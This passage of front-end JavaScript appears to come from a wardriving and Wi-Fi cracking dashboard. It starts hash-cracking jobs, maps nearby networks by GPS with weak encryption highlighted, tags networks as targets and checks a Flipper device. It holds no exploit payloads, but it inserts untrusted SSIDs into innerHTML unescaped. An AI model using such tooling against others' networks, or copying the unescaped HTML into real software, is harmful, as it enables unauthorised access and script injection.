            logGlassActivity('‚ñ∂Ô∏è Starting: ' + filename);
            try {
                const response = await fetch('/api/glass/start', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ filename: filename, stage: '1' })
                });
                const result = await response.json();
                if (result.success) {
                    logGlassActivity('‚úì Started cracking');
                    refreshGlassQueue();
                } else {
                    logGlassActivity('‚ö†Ô∏è ' + (result.error || 'Failed to start'));
                }
            } catch (error) {
                logGlassActivity('‚ö†Ô∏è Error: ' + error);
            }
        }
        
        async function resumeGlassFile(filename) {
            logGlassActivity('‚èµ Resuming: ' + filename);
            try {
                const response = await fetch('/api/glass/resume', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ session: filename })
                });
                const result = await response.json();
                if (result.success) {
                    logGlassActivity('‚úì Resumed from checkpoint');
                    refreshGlassQueue();
                } else {
                    logGlassActivity('‚ö†Ô∏è ' + (result.error || 'Failed to resume'));
                }
            } catch (error) {
                logGlassActivity('‚ö†Ô∏è Error: ' + error);
            }
        }
        
        function logGlassActivity(message) {
            const logEl = document.getElementById('glassActivityLog');
            const time = new Date().toLocaleTimeString();
            logEl.innerHTML = '[' + time + '] ' + message + '\n' + logEl.innerHTML;
        }
        
        // Glass initialization handled by switchPage('cracking') which calls:
        // - checkGlassConnection()
        // - loadHashFiles()
        // - startGlassLivePolling() - which refreshes queue every 3s
        
        // ========== END GLASS FUNCTIONS ==========

        // ========== WARDRIVING FUNCTIONS ==========
        
        function refreshWardriveMap() {
            const frame = document.getElementById('wardriveMapFrame');
            const btn = document.getElementById('historyRefreshBtn');

            // Show overlay
            var overlay = document.getElementById('mapRefreshOverlay');
            if (!overlay) {
                overlay = document.createElement('div');
                overlay.id = 'mapRefreshOverlay';
                overlay.style.cssText = 'position:absolute; top:0; left:0; right:0; bottom:0; background:rgba(0,0,0,0.7); display:flex; align-items:center; justify-content:center; color:#00ff00; font-size:16px; z-index:100; pointer-events:none;';
                overlay.textContent = 'Regenerating map...';
                frame.parentElement.style.position = 'relative';
                frame.parentElement.appendChild(overlay);
            }
            overlay.style.display = 'flex';

            // Disable button
            if (btn) { btn.disabled = true; btn.textContent = '‚è≥ Loading...'; }

            // Reload iframe
            frame.src = frame.src;
            logWardriveSync('üó∫Ô∏è Refreshing map...');

            // Listen for load
            frame.onload = function() {
                overlay.style.display = 'none';
                if (btn) { btn.disabled = false; btn.textContent = 'Refresh Map'; }
                logWardriveSync('üó∫Ô∏è Map loaded');
            };
        }

        // ========== LIVE WARDRIVE FUNCTIONS ==========
        var liveMode = false;
        var liveMap = null;
        var liveEventSource = null;
        var liveGpsMarker = null;
        var liveTrackLine = null;
        var liveTrackPoints = [];
        var liveMarkers = {};
        var liveElapsedTimer = null;
        var liveStartTime = null;
        var liveNewNetworks = 0;
        var gpsPollingTimer = null;
        var gpsFirstFix = false;
        var navMode = false;
        var lastHeading = 0;
        var liveScanning = false;    // True when scan is active (local or synced)
        var liveSyncTimer = null;     // Interval for polling backend scan state

        function toggleNavMode() {
            navMode = !navMode;
            applyNavModeUI();
            // Sync nav state to server so phone mirrors it
            fetch('/api/wardrive/live/nav', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ enabled: navMode })
            }).catch(function() {});
        }

        function applyNavModeUI() {
            var btn = document.getElementById('navModeBtn');
            if (navMode) {
                btn.style.background = '#004488';
                btn.textContent = 'üß≠ Nav ON';
                // Immediately center on current position if we have a fix
                if (liveMap && liveGpsMarker && liveMap.hasLayer(liveGpsMarker)) {
                    liveMap.setView(liveGpsMarker.getLatLng(), Math.max(liveMap.getZoom(), 17));
                }
            } else {
                btn.style.background = '#333';
                btn.textContent = 'üß≠ Nav';
                // Clear map rotation
                var container = document.getElementById('liveMapContainer');
                if (container) {
                    container.style.transform = '';
                    var controls = container.querySelector('.leaflet-control-container');
                    if (controls) controls.style.transform = '';
                }
            }
        }

        // ========== HOTSPOT FUNCTIONS ==========

        function checkHotspotStatus() {
            fetch('/api/hotspot/status')
                .then(r => r.json())
                .then(data => {
                    var btn = document.getElementById('hotspotBtn');
                    if (data.active) {
                        btn.style.background = '#006600';
                        btn.textContent = 'üì± Hotspot ON';
                        btn.title = 'Hotspot active ‚Äî SSID: ' + data.ssid + ' | URL: ' + data.url + ' | Clients: ' + (data.clients || 0);
                    } else {
                        btn.style.background = '#333';
                        btn.textContent = 'üì± Hotspot';
                        btn.title = 'Toggle WiFi hotspot ‚Äî phone connects to Arsenal-Control to access this UI';
                    }
                })
                .catch(function() {});
        }

        function toggleHotspot() {
            var btn = document.getElementById('hotspotBtn');
            var isOn = btn.textContent.indexOf('ON') !== -1;

            if (isOn) {
                // Turn off
                btn.textContent = 'üì± Stopping...';
                btn.style.background = '#444400';
                fetch('/api/hotspot/stop', { method: 'POST' })
                    .then(r => r.json())
                    .then(data => {
                        if (data.success) {
                            btn.style.background = '#333';
                            btn.textContent = 'üì± Hotspot';
                            btn.title = 'Toggle WiFi hotspot ‚Äî phone connects to Arsenal-Control to access this UI';
                        } else {
                            btn.style.background = '#880000';
                            btn.textContent = 'üì± Error';
                            alert('Hotspot stop failed: ' + (data.error || 'Unknown error'));
                            setTimeout(checkHotspotStatus, 2000);
                        }
                    });
            } else {
                // Turn on
                btn.textContent = 'üì± Starting...';
                btn.style.background = '#444400';
                fetch('/api/hotspot/start', { method: 'POST' })
                    .then(r => r.json())
                    .then(data => {
                        if (data.success) {
                            btn.style.background = '#006600';
                            btn.textContent = 'üì± Hotspot ON';
                            btn.title = 'Hotspot active ‚Äî SSID: ' + data.ssid + ' | URL: ' + data.url;
                            alert('Hotspot Active!\n\nSSID: ' + data.ssid + '\nPassword: ' + data.password + '\nPhone URL: ' + data.url + '/mobile.html\n\nConnect your phone to this network, then open the URL in your browser.');
                        } else {
                            btn.style.background = '#880000';
                            btn.textContent = 'üì± Error';
                            alert('Hotspot start failed: ' + (data.error || 'Unknown error'));
                            setTimeout(checkHotspotStatus, 2000);
                        }
                    });
            }
        }

        // Check hotspot status on page load
        checkHotspotStatus();

        // ========== END HOTSPOT FUNCTIONS ==========

        function toggleLiveMode() {
            liveMode = !liveMode;
            var btn = document.getElementById('liveToggleBtn');
            var iframe = document.getElementById('wardriveMapFrame');
            var liveDiv = document.getElementById('liveWardriveContainer');
            var refreshBtn = document.getElementById('historyRefreshBtn');

            if (liveMode) {
                btn.textContent = 'üìã History Mode';
                btn.style.background = '#330033';
                btn.title = 'Switch back to historical map view';
                iframe.style.display = 'none';
                liveDiv.style.display = 'flex';
                refreshBtn.style.display = 'none';
                initLiveMap();
                startGpsPolling();
            } else {
                btn.textContent = 'üì° Live Mode';
                btn.style.background = '#003300';
                btn.title = 'Switch to live scanning mode';
                iframe.style.display = '';
                liveDiv.style.display = 'none';
                refreshBtn.style.display = '';
                stopGpsPolling();
                gpsFirstFix = false;
                // Reload iframe to pick up any new data from live session
                refreshWardriveMap();
            }
        }

        function startGpsPolling() {
            stopGpsPolling();
            pollGpsStatus();
            gpsPollingTimer = setInterval(pollGpsStatus, 3000);
        }

        function stopGpsPolling() {
            if (gpsPollingTimer) { clearInterval(gpsPollingTimer); gpsPollingTimer = null; }
        }

        async function pollGpsStatus() {
            try {
                var resp = await fetch('/api/wardrive/live/gps');
                var gps = await resp.json();
                var fixEl = document.getElementById('gpsFixStatus');
                var satEl = document.getElementById('gpsSatCount');
                var hdopEl = document.getElementById('gpsHdop');
                if (!gps.connected) {
                    fixEl.textContent = 'Disconnected';
                    fixEl.style.color = '#ff4444';
                    satEl.textContent = '0';
                    if (hdopEl) hdopEl.textContent = '';
                } else if (gps.fix) {
                    fixEl.textContent = 'Fix OK';
                    fixEl.style.color = '#00ff00';
                    satEl.textContent = gps.satellites;
                    if (hdopEl && gps.hdop !== undefined) {
                        var h = parseFloat(gps.hdop);
                        if (h > 0) {
                            var accFt = Math.round(h * 2.5 * 3.281);
                            hdopEl.textContent = '\u00b1' + accFt + 'ft';
                            hdopEl.style.color = accFt <= 16 ? '#00ff00' : accFt <= 40 ? '#ffaa00' : '#ff4444';
                        } else { hdopEl.textContent = ''; }
                    }
                    if (liveMap && gps.latitude && gps.longitude) {
                        // Update marker position
                        liveGpsMarker.setLatLng([gps.latitude, gps.longitude]);
                        if (!liveMap.hasLayer(liveGpsMarker)) {
                            liveGpsMarker.addTo(liveMap);
                        }
                        if (!gpsFirstFix) {
                            liveMap.setView([gps.latitude, gps.longitude], 17);
                            gpsFirstFix = true;
                        }
                        // Update heading arrow
                        if (gps.speed > 1.5 && gps.heading !== undefined) {
                            lastHeading = gps.heading;
                        }
                        var arrow = document.getElementById('navArrow');
                        var container = document.getElementById('liveMapContainer');
                        if (navMode) {
                            if (container) {
                                container.style.transform = 'rotate(' + (-lastHeading) + 'deg) scale(1.2)';
                                container.style.transformOrigin = 'center center';
                                container.style.transition = 'transform 0.5s ease';
                            }
                            var controls = container ? container.querySelector('.leaflet-control-container') : null;
                            if (controls) {
                                controls.style.transform = 'rotate(' + lastHeading + 'deg)';
                                controls.style.transformOrigin = 'top left';
                                controls.style.transition = 'transform 0.5s ease';
                            }
                            if (arrow) arrow.style.transform = 'rotate(' + lastHeading + 'deg)';
                            liveMap.panTo([gps.latitude, gps.longitude], {animate: true, duration: 0.5});
                        } else {
                            if (container) container.style.transform = '';
                            var controls2 = container ? container.querySelector('.leaflet-control-container') : null;
                            if (controls2) controls2.style.transform = '';
                            if (arrow) arrow.style.transform = 'rotate(' + lastHeading + 'deg)';
                        }
                        // Update speed + heading display
                        document.getElementById('gpsSpeed').textContent = (gps.speed || 0).toFixed(1);
                        var headingEl = document.getElementById('gpsHeading');
                        if (headingEl) {
                            var dirs = ['N','NE','E','SE','S','SW','W','NW'];
                            var dir = dirs[Math.round(lastHeading / 45) % 8];
                            headingEl.textContent = Math.round(lastHeading) + '\u00b0 ' + dir;
                        }
                    }
                } else {
                    fixEl.textContent = 'No Fix';
                    fixEl.style.color = '#ffaa00';
                    satEl.textContent = gps.satellites;
                    if (hdopEl) hdopEl.textContent = '';
                }
            } catch(e) {
                // ignore polling errors
            }
        }

        function initLiveMap() {
            if (liveMap) return;
            liveMap = L.map('liveMapContainer', {
                center: [29.93, -96.96],
                zoom: 13,
                zoomControl: true
            });
            L.tileLayer('/wardrive_system/tiles/m/{z}/{x}/{y}.png', {
                attribution: 'Offline',
                maxZoom: 20,
                errorTileUrl: ''
            }).addTo(liveMap);
            L.tileLayer('https://mt1.google.com/vt/lyrs=m&x={x}&y={y}&z={z}', {
                attribution: 'Google',
                maxZoom: 22,
                errorTileUrl: ''
            }).addTo(liveMap);
            liveGpsMarker = L.marker([0, 0], {
                icon: L.divIcon({
                    className: 'nav-arrow-icon',
                    html: '<div id="navArrowOuter" style="position:relative; width:40px; height:40px;">'
                        + '<div style="position:absolute; inset:0; border-radius:50%; background:rgba(0,136,255,0.15); border:2px solid rgba(0,136,255,0.4);"></div>'
                        + '<div id="navArrow" style="position:absolute; inset:0; display:flex; align-items:center; justify-content:center; transition:transform 0.5s ease;">'
                        + '<svg width="24" height="24" viewBox="0 0 24 24"><polygon points="12,2 5,20 12,15 19,20" fill="#0088ff" stroke="#fff" stroke-width="1.5"/></svg>'
                        + '</div>'
                        + '</div>',
                    iconSize: [40, 40],
                    iconAnchor: [20, 20]
                }),
                zIndexOffset: 9999
            });
            liveTrackLine = L.polyline([], {
                color: '#00aaff', weight: 3, opacity: 0.7
            }).addTo(liveMap);
            // Re-fit map when entering/exiting fullscreen
            document.addEventListener('fullscreenchange', function() {
                if (liveMap) setTimeout(function() { liveMap.invalidateSize(); }, 200);
            });
            // Disable nav mode if user manually drags the map
            liveMap.on('dragstart', function() {
                if (navMode) {
                    navMode = false;
                    var btn = document.getElementById('navModeBtn');
                    btn.style.background = '#333';
                    btn.textContent = 'üß≠ Nav';
                    // Clear map rotation
                    var container = document.getElementById('liveMapContainer');
                    if (container) {
                        container.style.transform = '';
                        var controls = container.querySelector('.leaflet-control-container');
                        if (controls) controls.style.transform = '';
                    }
                }
            });
            // Fix map size after container becomes visible
            setTimeout(function() { liveMap.invalidateSize(); }, 100);
        }

        function showScanNamePrompt() {
            initLiveMap();
            var name = prompt('Session name (leave blank for auto):', '');
            if (name === null) return; // cancelled
            startLiveWardrive(name.trim());
        }

        async function startLiveWardrive(sessionName) {
            try {
                var body = {};
                if (sessionName) body.session_name = sessionName;
                var response = await fetch('/api/wardrive/live/start', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(body)
                });
                var result = await response.json();
                if (!result.success) {
                    alert('Failed to start: ' + result.error);
                    return;
                }
                liveScanning = true;
                document.getElementById('liveStartBtn').style.display = 'none';
                document.getElementById('liveStopBtn').style.display = '';
                document.getElementById('liveNetworkFeed').innerHTML = '';
                liveStartTime = Date.now();
                liveNewNetworks = 0;
                document.getElementById('liveNetworkCount').textContent = '0';
                document.getElementById('liveNewCount').textContent = '0';
                liveElapsedTimer = setInterval(updateLiveElapsed, 1000);
                // Clear previous markers
                Object.values(liveMarkers).forEach(function(m) { liveMap.removeLayer(m); });
                liveMarkers = {};
                liveTrackPoints = [];
                liveTrackLine.setLatLngs([]);
                if (liveMap.hasLayer(liveGpsMarker)) liveMap.removeLayer(liveGpsMarker);
                // Connect SSE
                liveEventSource = new EventSource('/api/wardrive/live/stream');
                liveEventSource.onmessage = function(e) {
                    handleLiveEvent(JSON.parse(e.data));
                };
                liveEventSource.onerror = function() {
                    console.log('SSE error');
                };
                addToFeed('Scan started - session #' + result.session_id, '#00ff00');
                logWardriveSync('üì° Live scan started - session #' + result.session_id);
                setStatus('SCANNING', true);
            } catch(e) {
                alert('Error: ' + e);
            }
        }

        async function stopLiveWardrive() {
            if (liveEventSource) { liveEventSource.close(); liveEventSource = null; }
            if (liveElapsedTimer) { clearInterval(liveElapsedTimer); liveElapsedTimer = null; }
            liveScanning = false;
            try {
                var response = await fetch('/api/wardrive/live/stop', {method: 'POST'});
                var result = await response.json();
                document.getElementById('liveStartBtn').style.display = '';
                document.getElementById('liveStopBtn').style.display = 'none';
                if (result.success) {
                    var msg = 'SESSION COMPLETE: ' + result.networks_found + ' networks (' + result.new_networks + ' new) in ' + formatElapsed(result.elapsed);
                    addToFeed(msg, '#00ff00');
                    logWardriveSync('üì° ' + msg);
                    addToFeed('Map regenerating in background...', '#888');
                    // Auto-refresh stats and sessions after scan ends
                    refreshWardriveStats();
                    loadSessions();
                }
                setStatus('IDLE', false);
            } catch(e) {
                console.error('Stop error:', e);
                setStatus('IDLE', false);
            }
        }

        function handleLiveEvent(data) {
            if (data.type === 'network') {
                var color = data.auth_mode.indexOf('OPEN') !== -1 ? '#ff4444' :
                           data.auth_mode.indexOf('WEP') !== -1 ? '#ff8800' :
                           data.auth_mode.indexOf('WPA3') !== -1 ? '#2ecc71' :
                           data.auth_mode.indexOf('WPA2') !== -1 ? '#27ae60' :
                           data.auth_mode.indexOf('WPA') !== -1 ? '#90EE90' : '#95a5a6';
                if (!liveMarkers[data.mac] && data.lat && data.lon) {
                    var marker = L.circleMarker([data.lat, data.lon], {
                        radius: 6, color: color, fillColor: color,
                        fillOpacity: 0.7, weight: 1
                    }).addTo(liveMap);
                    marker.bindPopup('<b>' + (data.ssid || '[Hidden]') + '</b><br>' +
                        data.mac + '<br>' + data.auth_mode + ' CH:' + data.channel +
                        '<br>' + data.rssi + ' dBm');
                    liveMarkers[data.mac] = marker;
                } else if (liveMarkers[data.mac] && data.lat && data.lon) {
                    // Update position as triangulation improves
                    liveMarkers[data.mac].setLatLng([data.lat, data.lon]);
                }
                document.getElementById('liveNetworkCount').textContent = Object.keys(liveMarkers).length;
                if (data.is_new) {
                    liveNewNetworks++;
                    document.getElementById('liveNewCount').textContent = liveNewNetworks;
                }
                var prefix = data.is_new ? 'NEW' : 'UPD';
                var feedColor = data.is_new ? '#00ff00' : '#555';
                var name = data.ssid || data.mac.substr(0,8);
                var auth = data.auth_mode || '?';
                var ch = data.channel ? 'ch' + data.channel : '';
                var sig = data.rssi + 'dBm';
                // Color auth type
                var authColor = auth === 'OPEN' ? '#ff4444' : auth === 'WEP' ? '#ff8800' : '#27ae60';
                var feedHtml = '<span style="color:' + (data.is_new ? '#00ff00' : '#666') + ';">[' + prefix + ']</span> '
                    + '<span style="color:#ddd;">' + name + '</span> '
                    + '<span style="color:' + authColor + ';">' + auth + '</span> '
                    + '<span style="color:#888;">' + sig + ' ' + ch + '</span>';
                addToFeedHtml(feedHtml, feedColor);
            } else if (data.type === 'gps' && data.position) {
                var pos = data.position;
                if (pos.latitude && pos.longitude) {
                    liveGpsMarker.setLatLng([pos.latitude, pos.longitude]);
                    if (!liveMap.hasLayer(liveGpsMarker)) {
                        liveGpsMarker.addTo(liveMap);
                        if (!gpsFirstFix) {
                            liveMap.setView([pos.latitude, pos.longitude], 17);
                            gpsFirstFix = true;
                        }
                    }
                    // Rotate heading arrow when moving (avoid jitter when stationary)
                    if (pos.speed_mph > 1.5 && pos.heading !== undefined) {
                        lastHeading = pos.heading;
                    }
                    var arrow = document.getElementById('navArrow');
                    var container = document.getElementById('liveMapContainer');
                    if (navMode) {
                        // Rotate entire map so heading = UP
                        if (container) {
                            container.style.transform = 'rotate(' + (-lastHeading) + 'deg) scale(1.2)';
                            container.style.transformOrigin = 'center center';
                            container.style.transition = 'transform 0.5s ease';
                        }
                        // Counter-rotate controls so they stay upright
                        var controls = container ? container.querySelector('.leaflet-control-container') : null;
                        if (controls) {
                            controls.style.transform = 'rotate(' + lastHeading + 'deg)';
                            controls.style.transformOrigin = 'top left';
                            controls.style.transition = 'transform 0.5s ease';
                        }
                        // Arrow points UP in nav mode (map rotation cancels arrow rotation)
                        if (arrow) arrow.style.transform = 'rotate(' + lastHeading + 'deg)';
                        // Auto-center
                        liveMap.panTo([pos.latitude, pos.longitude], {animate: true, duration: 0.5});
                    } else {
                        // No rotation, just show heading on arrow
                        if (container) container.style.transform = '';
                        var controls2 = container ? container.querySelector('.leaflet-control-container') : null;
                        if (controls2) controls2.style.transform = '';
                        if (arrow) arrow.style.transform = 'rotate(' + lastHeading + 'deg)';
                    }
                    // Only add track points when moving (speed > 2 mph) to filter GPS jitter
                    if (pos.speed_mph > 2) {
                        liveTrackPoints.push([pos.latitude, pos.longitude]);
                        liveTrackLine.setLatLngs(liveTrackPoints);
                    }
                    document.getElementById('gpsFixStatus').textContent = 'Fix OK';
                    document.getElementById('gpsFixStatus').style.color = '#00ff00';
                    document.getElementById('gpsSatCount').textContent = pos.satellites || 0;
                    document.getElementById('gpsSpeed').textContent = (pos.speed_mph || 0).toFixed(1);
                    // Show GPS accuracy estimate
                    var hdopEl2 = document.getElementById('gpsHdop');
                    if (hdopEl2 && pos.hdop !== undefined) {
                        var h2 = parseFloat(pos.hdop);
                        if (h2 > 0) {
                            var accFt2 = Math.round(h2 * 2.5 * 3.281);
                            hdopEl2.textContent = '\u00b1' + accFt2 + 'ft';
                            hdopEl2.style.color = accFt2 <= 16 ? '#00ff00' : accFt2 <= 40 ? '#ffaa00' : '#ff4444';
                        } else { hdopEl2.textContent = ''; }
                    }
                    // Show heading in status bar
                    var headingEl = document.getElementById('gpsHeading');
                    if (headingEl) {
                        var dirs = ['N','NE','E','SE','S','SW','W','NW'];
                        var dir = dirs[Math.round(lastHeading / 45) % 8];
                        headingEl.textContent = Math.round(lastHeading) + '\u00b0 ' + dir;
                    }
                }
            } else if (data.type === 'stopped' || data.type === 'session_end') {
                // Scan was stopped externally (e.g. from phone dashboard)
                liveScanning = false;
                if (liveEventSource) { liveEventSource.close(); liveEventSource = null; }
                if (liveElapsedTimer) { clearInterval(liveElapsedTimer); liveElapsedTimer = null; }
                document.getElementById('liveStartBtn').style.display = '';
                document.getElementById('liveStopBtn').style.display = 'none';
                addToFeed('Scan stopped (external)', '#ffaa00');
                setStatus('IDLE', false);
            }
        }

        function addToFeed(text, color) {
            var feed = document.getElementById('liveNetworkFeed');
            var div = document.createElement('div');
            div.style.color = color || '#aaa';
            div.style.borderBottom = '1px solid #1a1a1a';
            div.style.padding = '2px 0';
            var now = new Date();
            var time = now.toLocaleTimeString([], {hour: '2-digit', minute: '2-digit', second: '2-digit'});
            div.textContent = time + ' ' + text;
            feed.insertBefore(div, feed.firstChild);
            while (feed.children.length > 200) feed.removeChild(feed.lastChild);
        }

        function addToFeedHtml(html, color) {
            var feed = document.getElementById('liveNetworkFeed');
            var div = document.createElement('div');
            div.style.borderBottom = '1px solid #1a1a1a';
            div.style.padding = '2px 0';
            var now = new Date();
            var time = now.toLocaleTimeString([], {hour: '2-digit', minute: '2-digit', second: '2-digit'});
            div.innerHTML = '<span style="color:#444;">' + time + '</span> ' + html;
            feed.insertBefore(div, feed.firstChild);
            while (feed.children.length > 200) feed.removeChild(feed.lastChild);
        }

        function updateLiveElapsed() {
            if (!liveStartTime) return;
            var secs = Math.floor((Date.now() - liveStartTime) / 1000);
            var elapsed = formatElapsed(secs);
            document.getElementById('liveElapsed').textContent = elapsed;
            document.getElementById('status').textContent = 'SCAN ' + elapsed;
        }

        function formatElapsed(secs) {
            var m = Math.floor(secs / 60);
            var s = secs % 60;
            return (m < 10 ? '0' : '') + m + ':' + (s < 10 ? '0' : '') + s;
        }
        // ========== SCAN STATE SYNC (laptop ‚Üî phone) ==========
        function startSyncPolling() {
            stopSyncPolling();
            syncScanState();
            liveSyncTimer = setInterval(syncScanState, 5000);
        }

        function stopSyncPolling() {
            if (liveSyncTimer) { clearInterval(liveSyncTimer); liveSyncTimer = null; }
        }

        async function syncScanState() {
            try {
                var response = await fetch('/api/wardrive/live/status');
                var status = await response.json();

                if (status.running && !liveScanning) {
                    // Scan started externally (e.g. from phone) - sync up
                    liveScanning = true;
                    if (!liveMode) { toggleLiveMode(); }
                    initLiveMap();
                    document.getElementById('liveStartBtn').style.display = 'none';
                    document.getElementById('liveStopBtn').style.display = '';
                    liveStartTime = Date.now() - ((status.elapsed || 0) * 1000);
                    liveElapsedTimer = setInterval(updateLiveElapsed, 1000);
                    document.getElementById('liveNetworkCount').textContent = status.networks_found || 0;
                    document.getElementById('liveNewCount').textContent = status.new_networks || 0;
                    // Connect SSE stream
                    if (liveEventSource) { liveEventSource.close(); }
                    liveEventSource = new EventSource('/api/wardrive/live/stream');
                    liveEventSource.onmessage = function(e) {
                        handleLiveEvent(JSON.parse(e.data));
                    };
                    liveEventSource.onerror = function() { console.log('SSE error (sync)'); };
                    addToFeed('Synced to active scan - session #' + (status.session_id || '?'), '#00aaff');
                    setStatus('SCANNING', true);
                } else if (!status.running && liveScanning) {
                    // Scan stopped externally - clean up (fallback if SSE missed it)
                    liveScanning = false;
                    if (liveEventSource) { liveEventSource.close(); liveEventSource = null; }
                    if (liveElapsedTimer) { clearInterval(liveElapsedTimer); liveElapsedTimer = null; }
                    document.getElementById('liveStartBtn').style.display = '';
                    document.getElementById('liveStopBtn').style.display = 'none';
                    addToFeed('Scan stopped (external)', '#ffaa00');
                    setStatus('IDLE', false);
                }

                // Sync nav mode from server (works whether scan is running or not)
                if (typeof status.nav_mode !== 'undefined' && status.nav_mode !== navMode) {
                    navMode = status.nav_mode;
                    applyNavModeUI();
                }
            } catch(e) {
                // Network error - skip this cycle
            }
        }
        // Global scan detector - auto-navigates to wardriving page when scan starts from phone
        var globalScanPoll = null;
        function startGlobalScanPoll() {
            if (globalScanPoll) return;
            globalScanPoll = setInterval(async function() {
                // Only act when NOT already on the wardriving page
                var wardrivePage = document.getElementById('page-wardriving');
                if (wardrivePage && wardrivePage.classList.contains('active')) return;
                try {
                    var r = await fetch('/api/wardrive/live/status');
                    var s = await r.json();
                    if (s.running) {
                        // Scan detected from another client - auto-switch to wardriving
                        showPage('wardriving');
                    }
                } catch(e) {}
            }, 5000);
        }
        // Start global poll on page load
        startGlobalScanPoll();
        // ========== END SCAN STATE SYNC ==========

        // ========== END LIVE WARDRIVE FUNCTIONS ==========

        // Target tagging functions - called from map popup buttons
        async function tagNetwork(mac, tagCategory) {
            try {
                // Toggle: if already this tag, remove it instead
                var f = document.getElementById('wardriveMapFrame');
                var currentTag = null;
                try { currentTag = f.contentWindow.networkProperties && f.contentWindow.networkProperties[mac] ? f.contentWindow.networkProperties[mac].tag : null; } catch(e) {}
                if (currentTag === tagCategory) {
                    return removeNetworkTag(mac);
                }
                const response = await fetch(`/api/wardrive/tag/${encodeURIComponent(mac)}`, {
                    method: 'PUT',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({tag_category: tagCategory})
                });
                const result = await response.json();
                if (result.success) {
                    logWardriveSync(`üéØ Tagged ${result.ssid || mac} as ${tagCategory}`);
                    try { if (f.contentWindow.networkProperties && f.contentWindow.networkProperties[mac]) f.contentWindow.networkProperties[mac].tag = tagCategory; } catch(e) {}
                } else {
                    logWardriveSync(`‚ùå Tag failed: ${result.error}`);
                }
            } catch (error) {
                logWardriveSync(`‚ùå Tag error: ${error.message}`);
            }
        }

        async function removeNetworkTag(mac) {
            try {
                const response = await fetch(`/api/wardrive/tag/${encodeURIComponent(mac)}`, {
                    method: 'DELETE'
                });
                const result = await response.json();
                if (result.success) {
                    logWardriveSync(`üè∑Ô∏è Removed tag from ${mac}`);
                    // Clear tag in iframe networkProperties so filters update immediately
                    try { var f = document.getElementById('wardriveMapFrame'); if (f.contentWindow.networkProperties && f.contentWindow.networkProperties[mac]) f.contentWindow.networkProperties[mac].tag = null; } catch(e) {}
                } else {
                    logWardriveSync(`‚ùå Remove tag failed: ${result.error}`);
                }
            } catch (error) {
                logWardriveSync(`‚ùå Remove tag error: ${error.message}`);
            }
        }

        // ========== CUSTOM MARKER FUNCTIONS ==========
        var markerPlacementMode = false;
        var pendingMarkerLatLng = null;

        function toggleMarkerPlacement() {
            var btn = document.getElementById('placeMarkerBtn');
            var frame = document.getElementById('wardriveMapFrame');
            markerPlacementMode = !markerPlacementMode;
            if (markerPlacementMode) {
                btn.style.background = '#aa00aa';
                btn.textContent = 'üìç Click Map...';
                frame.contentWindow.postMessage('enable-placement', '*');
                logWardriveSync('üìç Click on the map to place a marker');
            } else {
                btn.style.background = '#550055';
                btn.textContent = 'üìç Place Marker';
                frame.contentWindow.postMessage('disable-placement', '*');
                document.getElementById('markerForm').style.display = 'none';
            }
        }

        function cancelMarkerPlacement() {
            markerPlacementMode = false;
            pendingMarkerLatLng = null;
            document.getElementById('markerForm').style.display = 'none';
            document.getElementById('placeMarkerBtn').style.background = '#550055';
            document.getElementById('placeMarkerBtn').textContent = 'üìç Place Marker';
            document.getElementById('wardriveMapFrame').contentWindow.postMessage('disable-placement', '*');
        }

        // Listen for marker placement from iframe
        window.addEventListener('message', function(e) {
            if (e.data && e.data.type === 'marker-placed') {
                pendingMarkerLatLng = {lat: e.data.lat, lng: e.data.lng};
                document.getElementById('markerForm').style.display = 'block';
                document.getElementById('markerLabel').value = '';
                document.getElementById('markerLabel').focus();
                document.getElementById('placeMarkerBtn').style.background = '#550055';
                document.getElementById('placeMarkerBtn').textContent = 'üìç Place Marker';
                markerPlacementMode = false;
            }
        });

        async function saveCustomMarker() {
            if (!pendingMarkerLatLng) return;
            var label = document.getElementById('markerLabel').value.trim();
            var color = document.getElementById('markerColor').value;
            if (!label) { document.getElementById('markerLabel').style.border = '1px solid red'; return; }
            try {
                const response = await fetch('/api/wardrive/marker', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({lat: pendingMarkerLatLng.lat, lon: pendingMarkerLatLng.lng, label: label, color: color})
                });
                const result = await response.json();
                if (result.success) {
                    logWardriveSync(`üìç Placed marker: ${label}`);
                    // Inject marker into iframe immediately
                    var frame = document.getElementById('wardriveMapFrame');
                    frame.contentWindow.postMessage({type: 'add-marker', id: result.id, lat: result.lat, lng: pendingMarkerLatLng.lng, label: result.label, color: result.color}, '*');
                    document.getElementById('markerForm').style.display = 'none';
                    pendingMarkerLatLng = null;
                } else {
                    logWardriveSync(`‚ùå Marker save failed: ${result.error}`);
                }
            } catch (error) {
                logWardriveSync(`‚ùå Marker error: ${error.message}`);
            }
        }

        async function deleteCustomMarker(id) {
            try {
                const response = await fetch(`/api/wardrive/marker/${id}`, {method: 'DELETE'});
                const result = await response.json();
                if (result.success) {
                    logWardriveSync('üóëÔ∏è Custom marker deleted');
                    // Remove from iframe map
                    var frame = document.getElementById('wardriveMapFrame');
                    frame.contentWindow.postMessage({type: 'remove-marker', id: id}, '*');
                } else {
                    logWardriveSync(`‚ùå Delete failed: ${result.error}`);
                }
            } catch (error) {
                logWardriveSync(`‚ùå Delete error: ${error.message}`);
            }
        }

        // Allow Enter key to save marker
        document.addEventListener('DOMContentLoaded', function() {
            var labelInput = document.getElementById('markerLabel');
            if (labelInput) labelInput.addEventListener('keydown', function(e) { if (e.key === 'Enter') saveCustomMarker(); });
        });

        function openMapFullscreen() {
            if (liveMode && liveMap) {
                // Fullscreen the clip wrapper (keeps rotation contained)
                var clip = document.getElementById('liveMapClip');
                if (clip.requestFullscreen) {
                    clip.requestFullscreen().then(function() {
                        setTimeout(function() { liveMap.invalidateSize(); }, 200);
                    });
                } else if (clip.webkitRequestFullscreen) {
                    clip.webkitRequestFullscreen();
                    setTimeout(function() { liveMap.invalidateSize(); }, 200);
                }
            } else {
                window.open('/wardrive_system/wardrive_master_map.html', '_blank');
            }
        }
        
        async function checkFlipperStatus() {
            const dot = document.getElementById('flipperStatusDot');
            const text = document.getElementById('flipperStatusText');
            const portInfo = document.getElementById('flipperPortInfo');
            const syncBtn = document.getElementById('flipperSyncBtn');

            try {
                const response = await fetch('/api/flipper/status');
                const result = await response.json();

                if (result.connected && result.device === 'flipper') {
                    dot.style.background = '#00ff00';
                    text.textContent = 'Connected';
